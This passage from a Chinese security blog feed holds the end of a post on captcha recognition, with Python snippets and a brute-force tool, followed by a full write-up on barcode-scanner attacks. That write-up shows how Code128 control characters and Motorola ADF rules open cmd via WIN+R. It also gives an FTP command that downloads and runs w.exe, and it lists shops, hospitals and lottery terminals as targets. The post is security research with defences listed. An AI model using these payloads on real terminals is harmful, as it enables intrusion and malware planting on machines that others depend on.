</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding: UTF-8</span></div><div class="line">  import os</div><div class="line">  result = os.popen(<span class="string">'verifytool.exe D:\\woo.ci.png -f D:\\woo-verify.png'</span>).readlines()</div><div class="line">  <span class="keyword">print</span> (result)</div><div class="line"> <span class="comment"># coding: UTF-8</span></div><div class="line">   import os</div><div class="line">   result = os.popen(<span class="string">'verifytool.exe D:\\woo.ci.png -f D:\\woo-verify.png'</span>).readlines()</div><div class="line">   <span class="keyword">print</span> (result)</div></pre></td></tr></table></figure>
<p>在我的D盘有这样一张图：</p>
<p><img src="/images/69145828_23.png" alt="img"></p>
<p>这样别人就可以自己写脚本去做自己爱做的事情，不过我还是建议使用-p的方式来调用。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding: UTF-8</span></div><div class="line">  import urllib2</div><div class="line">  from socket import *</div><div class="line">  h = urllib2.urlopen(<span class="string">'http://www.wooyun.org/captcha.php'</span>)</div><div class="line">  str = h.read()                      <span class="comment">#获取验证码</span></div><div class="line">  s = socket(AF_INET,SOCK_DGRAM);</div><div class="line">  s.sendto(str,(<span class="string">'localhost'</span>,<span class="number">14250</span>))   <span class="comment">#将获取到的验证码发送给识别程序</span></div><div class="line">  code = s.recvfrom(<span class="number">65500</span>)            <span class="comment">#接受识别出来的验证码</span></div><div class="line">   <span class="keyword">print</span>(code)</div></pre></td></tr></table></figure></p>
<p><img src="/images/69145828_24.png" alt="img"></p>
<pre><code>如果程序是.NET平台编写，则可直接使用VerifyReader.dll文件，将其添加引用然后：
</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CodeInfo ci = CodeInfo.LoadFromFile(<span class="string">'D:\\woo.ci.png'</span>);</div><div class="line">CodeHelper helper = <span class="keyword">new</span> CodeHelper(ci);</div><div class="line">string code =      helper.GetCodeString(Image.FromFile(<span class="string">'D:\\woo-verify.png'</span>));此处输入代码</div></pre></td></tr></table></figure>
<p> 另外这里还单独的做了一个账户爆破的工具出来：<br> <img src="/images/69145828_25.png" alt="img"><br> 以下是用自己测试的结果：<br> <img src="/images/69145828_26.png" alt="img"><br> <img src="/images/69145828_27.png" alt="img"><br> 双击列表即可查看数据<br> <img src="/images/69145828_28.png" alt="img"></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>全套工具及核心代码和使用说明下载连接：<a href="http://down.future-sec.com/VerifyReader-1.1.zip" rel="external nofollow noopener noreferrer" target="_blank">http://down.future-sec.com/VerifyReader-1.1.zip</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;注：此文章只适合简单验证码，最后也将编写的工具附上以及关键部分代码和使用说明文档。&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;虽然验证码发展到如今有许多人类都难以识别的
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="python" scheme="http://www.future-sec.com/tags/python/"/>
    
      <category term="验证码" scheme="http://www.future-sec.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>一维条形码攻击技术(Badbarcode)</title>
    <link href="http://www.future-sec.com/badbarcode.html"/>
    <id>http://www.future-sec.com/badbarcode.html</id>
    <published>2016-02-24T16:00:00.000Z</published>
    <updated>2017-07-10T19:39:08.835Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在日常生活中，条形码随处可见，特别在超市，便利店，物流业，但你们扫的条形码真的安全吗？之前TK教主在PacSec介绍的条形码攻<br>击和twitter上的demo视频太炫酷，所以就自己买了个扫码器自己研究了一下 ，在研究时候也找遍了国内外所有资料，但是都没有对可以执行的攻击技术完整的文章，故有此文分享。</p>
<h2 id="条形码介绍"><a href="#条形码介绍" class="headerlink" title="条形码介绍"></a>条形码介绍</h2><p><img src="/images/N7NjIvr.png" alt="img"><br>条形码(barcode)是将宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符。常见的条形码是由反射率相差很大的黑条（简称条）和白条（简称空）排成的平行线图案。<br>常见的条形码类型有code39 code128 code93 EAN128 EAN13QR等，前面大部分是一维条形码，而QR则是二维条形码，本文重点针对支持一维条形码的扫码器。其中code128是使用最广泛，支持字符最多的一种类<br>型，一般都利用code128条形码进行攻击。</p>
<h2 id="扫码器介绍"><a href="#扫码器介绍" class="headerlink" title="扫码器介绍"></a>扫码器介绍</h2><p><img src="/images/iUrQFz7.png" alt="img"><br>扫码器，大家几乎每天都能看到，在超市付账，物流，医院，彩票等。作用就是把条形码的信息提取出来，而常规的扫码器的工作原理是利用红外线照射，然后反射得出条形码的信息，再用扫描器内置的芯片处理得出结果。国际上常用的扫描器品牌有Symbol，Honeywell，Datalogic等，其中symbol已被摩托罗拉收购。<br>大家在超市购物付账时候都注意到，商品通过扫描后，商品的编码直接显示在屏幕上，其实很多扫码器都是用keyboard的方式输入的，也就是说一个扫描器就相当于一个键盘，这是一个较大的风险。<br><img src="/images/vqu6Rze.png" alt="img"></p>
<h2 id="Code128条形码"><a href="#Code128条形码" class="headerlink" title="Code128条形码"></a>Code128条形码</h2><p>既然知道扫描器是一个keyboard设备，只要控制条形码的数据就可以随意输入键盘数据了。但例如UPC条形码只支持数字，有些则只支持数字与字母，而Code128 是一种广泛使用的条形码类型，因为它支持ASCII<br>0-127字符，所以叫code128，条形码长度可调，最大支持232个字符。<br>Code128也分为三种：</p>
<ol>
<li>Code128A：标准数字和大写字母，控制符，特殊字符</li>
<li>Code128B：标准数字和大写字母，小写字母，特殊字符</li>
<li>Code128C/EAN128：[00]-[99]的数字对集合，共100个，即只能表示偶数位长度的数字。<br>Code128由四部分组成:起始码，数据码，校验码(可有可无)，结束码</li>
</ol>
<p><img src="/images/mMzyE3v.png" alt="img"></p>
<p>如上条形码，黑白相间，且线条粗细不一；由黑色线条(条，Bar)与空白(空，Space)组成，根据粗细程度，可以将以上条形码起始码解读<br>为:211214；第一条黑色竖线是由两个单位的竖线合并组成，而第二条空白竖线即由一个单位的竖线，如此类推。一般前6条的Bar与Space为一个单元。211214 用1,0转成逻辑码就是11010010000，也即是起始码。<br>起始码对照：<br>128A 11010000100<br>128B 11010010000<br>128C 11010011100<br> 结束码都是统一的1100011101011根据上面的解读出的逻辑码11010010000，就可以推断上面那个条形码是属于code128-B类型了。</p>
<p><img src="/images/FNN3Qb3.jpg" alt="img"></p>
<p><img src="/images/yQnYNj.jpg" alt="img"></p>
<p>最后再根据code128的编码表就可以分析出条形码的数据（编码表太长就不贴完了）<br>0x04 控制字符与条形码生成<br>根据上面分析的code128规则，已经可以自己写出一个读取识别和生成条形码的程序了。而我们是要执行操作，最简单的就是利用控制字符。控制字符即非显示字符，例如回车，换行，制表符等。在ASCII中，0-31和127 就是控制字符。<br><img src="/images/7nyaEr.jpg" alt="img"><br>根据ASCII的控制字符表，可以看出Ctrl+?的组合键几乎都有了，例如Ctrl+O，也就是打开文件，但这个只是局部快捷组合键，在一些程序<br>中才能应用，例如浏览器，word等等，利用这些控制字符在某些终端可以使程序跳出沙盒。如何生成可以使计算机执行Ctrl+O的条形码？因为已经上面已<br>经介绍过code128的规则算法，自己写程序也可以。网络也有很多条形码生成的小程序，但在这里推荐一个强大的条形码编辑工具：BarTender</p>
<p><img src="/images/vQjayqi.jpg" alt="img"></p>
<p>下载安装后点击菜单栏“文件”-“新建”-“完成”，就会出现一个空白模板。</p>
<p><img src="/images/jUziauY.jpg" alt="img"></p>
<p>然后点击条形码按钮就可以创建自己的条形码，选择code128类型。</p>
<p><img src="/images/6zA36nM.jpg" alt="img"></p>
<p>利用BarTender轻松就可以生成出条形码，而且字符可以随时改动，方便调试。扫描上图就验证码后，会输入“FutureSec”，然后输入控制字符Ctrl+O</p>
<p><img src="/images/reIN3ye.png" alt="img"></p>
<p>扫码器扫描后立即弹出对话框<br>市面上基本任何一款扫码器都能执行，因为code128是绝大部分扫码器都支持的。<br>0x05 Advanced Data Formatting（高级数据格式）<br>Advanced Data Formatting（ADF），高级数据格式。是摩托罗拉针对扫描器开发的一种更高级的数据输入，根据自己的设定一步一步的规则可以自定义输入的数据，也可以说是一种支持编程的条形码技术。<br>例如，在一个结账系统中，当你对一个商品扫描后，由于该结账系统不能直接对该条形码直接处理，就需要这种技术。结账系统识别码：A12345，前面要A开头；条形码的数据类型：12345 纯数字，想要在这个结账系统中识别就要在输入前进行处理。<br>再举个例子：<br>条形码的数据：<br>8523647122<br>通过ADF输出的数据：<br>8523641&amp;lt;Enter&amp;gt;<br>如何实现ADF？</p>
<p><img src="/images/QVreYzQ.png" alt="img"></p>
<p>现在网上仍然没有ADF的中文资料，而在外国的网站也寥寥无几，无人问津，但靠tk的ppt中提到的ADF也是一头雾水，因为没有具体技术描述，只是一行字带过。后来找到一份摩托罗拉撰写300多页的ADF指南PDF。<br>ADF是一种编程，根据自己的需求构建规则，而用的就不是用代码进行编程而是条形码。ADF把所有规则都用条形码表示，例如Perfix/Suffix，Replace，字符输入等。<br>利用ADF挟持扫描器数据<br>对扫描器进行ADF设置时要先扫描开始模式，Begin New Rule</p>
<p><img src="/images/6V3yEnR.jpg" alt="img"></p>
<p>此后开始扫描的条形码都会被添加规则，前提是规则的逻辑是合法的。<br>随后依次扫描下列条形码</p>
<p><img src="/images/aERbiai.jpg" alt="img"></p>
<p><img src="/images/uI3QNz.jpg" alt="img"></p>
<p><img src="/images/ZJrYZj7.jpg" alt="img"></p>
<p><img src="/images/AVb6Nfa.jpg" alt="img"></p>
<p>然后Save Rule</p>
<p><img src="/images/JVne6bV.jpg" alt="img"></p>
<p>当Save Rule，扫描器的输出数据都会被挟持成“TEST”，当你设置了ADF时，就会把你的规则按流程一步一步执行。<br>如何恢复？</p>
<p><img src="/images/73iq2i6.jpg" alt="img"></p>
<p>扫描清除所有规则条形码即可。</p>
<h2 id="利用ADF执行命令，种植木马"><a href="#利用ADF执行命令，种植木马" class="headerlink" title="利用ADF执行命令，种植木马"></a>利用ADF执行命令，种植木马</h2><p>由于单凭控制字符无法执行命令，而ADF支持简单的编程和更多的键，利用ADF可以轻松执行系统命令。由于ADF支持很多键，例如最有用的WIN+R。<br> 在ADF中称为GUI R，既然知道了可以WIN+R的键，利用上面的规则就可以弹出cmd执行了。但这样还是不行，因为输入的是由系统自动输入，速度是手打无法可比的，当你执行到GUI R，再执行”c”,”m”,”d”， win+r的对话框还没有出来就已经输入了cmd，所有要延时，而ADF就支持，相当于编程中的 sleep()。 </p>
<p><img src="/images/mMvE3i7.jpg" alt="img"></p>
<p>在录ADF规则时，扫描延时后要输入两个Numeric，例如依次0和1两个码，就代表延时0.1秒，0和5就代表0.5秒，默认是延时1秒。<br>知道这些ADF条形码后就可以构建弹出cmd，然后再利用控制字符执行命令，主要是Enter。但如果要按照以上这么搞的话，仅是弹出一个cmd窗口就要十多个条形码了，也就是说扫描器要扫十多次。可以先看看腾讯玄武实验室的demo视频：<br><a href="https://twitter.com/tombkeeper/status/663730674017300480" rel="external nofollow noopener noreferrer" target="_blank">https://twitter.com/tombkeeper/status/663730674017300480</a><br>视频中用了一叠条形码，依次扫描，扫描了十多次就出来个cmd，可能这与扫描器型号也有关系。</p>
<p><img src="/images/3YNNnaV.png" alt="img"></p>
<p>这样的话不管是规则生成和利用都非常繁琐，其实是可以优化的，ADF的规则可以合并。利用motorola的扫描器。</p>
<p><img src="/images/7VFVrqu.png" alt="img"></p>
<p>123scan是摩托罗拉官方出品非常强大的扫描器 管理软件，在其官网可以下载。功能很多，在这里就介绍利用123scan设置ADF。<br>打开后点击”Create new configuration file”-&gt;”My scanner is NOT<br>connected”-&gt;选择扫描器-&gt;”Mondify data”-&gt;”Program complex data modifications”-&gt;”Create a new rule”。</p>
<p><img src="/images/jM7vaqv.png" alt="img"></p>
<p>点击Add action就是添加规则。</p>
<p><img src="/images/qyeyUv7.png" alt="img"></p>
<p>ADF所有规则都在里面，包括Beep控制（控制扫描器蜂鸣），Replace等。</p>
<p><img src="/images/r67NVj.png" alt="img"></p>
<p>设置延时0.5秒，依次添加规则。</p>
<p><img src="/images/VjEFRzQ.png" alt="img"></p>
<p>最后会自动合并条形码并输出。</p>
<p><img src="/images/Jr2aama.png" alt="img"></p>
<p>以上就是执行任意命令的条形码payload，除去1和2的设置出厂设置和清除所有规则，只需要4个条形码就可以执行任意单条命令。其中Send<br>ALL that remains是代表设置ADF后扫描条形码的原本数据。<br>以上四组条形码的ADF流程是:输入WIN+R键-&gt;延时0.5秒-&gt;输入c键-&gt;输入m键-&gt;输入d键-&gt;输入回车<br>-&gt;延时0.5秒-&gt;执行条形码的内容，而随后的Send ALL that<br>remains就是你要执行的命令，可以多行命令，要是单行命令基本上4条就够不需要加Send ALL that remains。<br>利用ADF种植木马<br>既然已经可以执行cmd命令，最简单的方法就是利用ftp下载执行任意程序。上面提到的Send ALL that remains可以用BarTender生成出FTP命令。</p>
<p><img src="/images/y6bM7fQ.png" alt="img"></p>
<pre><code class="php"><span class="comment">#!bash ftp test?CR?a?CR?a?CR?get w.exe?CR?bye?CR?w.exe?CR?get w.exe?CR?bye?CR?w.exe?CR?</span>
</code></pre>
<p>下面给出我们的demo视频，是已经经过扫描四次ADF设置后。不管扫描什么条形码执行到Send ALL that remains。视频中是利用FTP命令执行。（测试型号Symbol-LS4208-SR20001ZZR）<br><a href="http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2" rel="external nofollow noopener noreferrer" target="_blank">http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2</a><br>密码:wooyun520</p>
<h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>简单总结一下可能存在攻击的场景地点:</p>
<h3 id="商店付款"><a href="#商店付款" class="headerlink" title="商店付款"></a>商店付款</h3><p><img src="/images/2ErAzu.png" alt="img"></p>
<p>直接把条形码替换到商品；很多便利店支持微信，支付宝二维码支付，扫描器也支持多个类型条形码，可以直接把条形码存在手机中，让其扫描；有些大型百货有资助价格查询终端，只要用特殊的条形码到终端一扫就能跳出终端。</p>
<h3 id="医院病历，检验单"><a href="#医院病历，检验单" class="headerlink" title="医院病历，检验单"></a>医院病历，检验单</h3><p><img src="/images/nyUzMva.png" alt="img"></p>
<p>现在医院的挂号，病历都会有个条形码，直接到医院自主终端或直接递给护士扫描；去医院都知道，有资助出检验单的终端，只要一扫就会单子，基本每个医院都有了。</p>
<p><img src="/images/NjYRRb6.png" alt="img"></p>
<h3 id="彩票"><a href="#彩票" class="headerlink" title="彩票"></a>彩票</h3><p><img src="/images/nyeIFre.png" alt="img"></p>
<p>彩票自身都会有条形码，兑换彩票就凭靠条形码到机器识别，所以伪造或对检验机进行攻击还是有可能，彩票终端类型这么多。</p>
<p><img src="/images/uUneYn2.png" alt="img"></p>
<h3 id="快递单子"><a href="#快递单子" class="headerlink" title="快递单子"></a>快递单子</h3><p><img src="/images/FZ7V7zA.png" alt="img"></p>
<p>快递都有条形码，一般是code128或者code39类型。在一些快递自助取件柜，和快递小哥扫描的时候或许会出现风险。</p>
<p><img src="/images/M7fA3em.png" alt="img"><br>。。。。。。<br>场景很多就不一一列举了，以上场景有空我会逐一分析。</p>
<h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><ol>
<li>扫码器默认不要开启ADF功能 </li>
<li>扫描器尽量不要使用键盘模拟 </li>
<li>设置热键黑名单</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一维条形码攻击的概念在国外很多年前就有提出了，但是没人深入研究。利用条形码也可能出现SQL注射，XSS，溢出等攻击。无论什么设备，只要能控制一部分输入，就存在风险！</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p> <a href="http://www.appsbarcode.com/code%20128.php" rel="external nofollow noopener noreferrer" target="_blank">http://www.appsbarcode.com/code%20128.php</a> Code 128 條碼．編碼規則<br> <a href="http://www.slideshare.net/mobile/PacSecJP/hyperchem-ma-ba" rel="external nofollow noopener noreferrer" target="_blank">http://www.slideshare.net/mobile/PacSecJP/hyperchem-ma-ba</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在日常生活中，条形码随处可见，特别在超市，便利店，物流业，但你们扫的条形码真的安全吗？之前TK教主在PacSec介绍的条形码攻&lt;br&gt;击和t
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="条形码" scheme="http://www.future-sec.com/tags/%E6%9D%A1%E5%BD%A2%E7%A0%81/"/>
    
  </entry>
  
</feed>
